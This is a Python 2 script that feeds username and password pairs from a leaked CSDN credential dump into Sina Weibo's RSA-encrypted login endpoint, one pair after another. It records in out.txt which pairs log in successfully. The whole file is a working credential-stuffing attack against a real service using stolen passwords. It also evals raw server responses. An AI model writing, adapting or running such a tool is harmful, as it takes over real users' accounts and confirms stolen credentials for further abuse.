
import urllib, urllib2, json, base64, rsa, time, binascii
import cookielib
import re
import hashlib
from Loginer import Session

headers = {'User-Agent': 'Mozilla/5.0'}

postdata = {'entry': 'weibo',
'gateway': '1',
'from': '',
'savestate': '7',
'userticket': '1',
'ssosimplelogin':'1',
'vsnf': '1',
'vsnval': '',
'su': '',
'service': 'miniblog',
'servertime': '',
'nonce': '',
'pwencode': 'rsa2',
'rsakv': '',
'sp': '',
'encoding': 'UTF-8',
'prelt':'130',
'domain': 'weibo.com',
'url':'http://weibo.com/ajaxlogin.php?framelogin=1&callback=parent.sinaSSOController.feedBackUrlCallBack',
'returntype': 'META'
}

def sinaEncryptMsg(pubkey, msg, servertime, nonce):
	rsaPublickey = int(pubkey, 16)  
	key = rsa.PublicKey(rsaPublickey, 65537) 
	message = str(servertime) + '\t' + str(nonce) + '\n' + str(password)
	passwd = rsa.encrypt(message, key) 
	passwd = binascii.b2a_hex(passwd)
	return passwd

pubkey='EB2A38568661887FA180BDDB5CABD5F21C7BFD59C090CB2D245A87AC253062882729293E5506350508E7F9AA3BB77F4333231490F915F6D63C55FE2F08A49B353F444AD3993CACC02DB784ABBB8E42A9B1BBFFFB38BE18D78E87A0E41B9B8F73A928EE0CCEE1F6739884B9777E4FE9E88A1BBE495927AC4A799B3181D6442443'
servertimeUrl = 'http://login.sina.com.cn/sso/prelogin.php?entry=weibo&callback=sinaSSOController.preloginCallBack&su=&rsakt=mod&client=ssologin.js(v1.4.18)&_='+str(long(time.time()*1000))
loginUrl = 'http://login.sina.com.cn/sso/login.php?client=ssologin.js(v1.4.18)'

f = open('/Users/kindai/Desktop/www.csdn.net.sql','r')
f2 = open('./out.txt','w')
while 1:
	line = f.readline()
	if not line:
		break
	username = line[line.rfind('# ')+2:-2]
	password = line[line.find('# ')+2:line.rfind(' #')]

	s = Session()
	s.open('http://weibo.com/')

	res = s.open(servertimeUrl)
	t = long(time.time()/1000)
	con = res.read()
	js = eval(con[35:-1])
	servertime=js['servertime']
	pubkey=js['pubkey']
	nonce=js['nonce']

	su = base64.encodestring(urllib.quote(username))[:-1]
	servertime = servertime + long(long(servertime)/1000) - t

	sp = sinaEncryptMsg(pubkey, password, servertime, nonce)

	postdata['nonce'] = nonce
	postdata['servertime'] = servertime
	postdata['su']=su
	postdata['sp']=sp
	postdata['rsakv'] = js['rsakv']

	login_data = urllib.urlencode(postdata)
	res = s.open(loginUrl, login_data)
	con = res.read()
	retcode = con[con.find('retcode=')+8:con.find('&',con.find('retcode='))]
	if retcode == '1':
		print >>f2, username+':'+password+':success'
	else:
		print >>f2, username+':'+password+':failed'
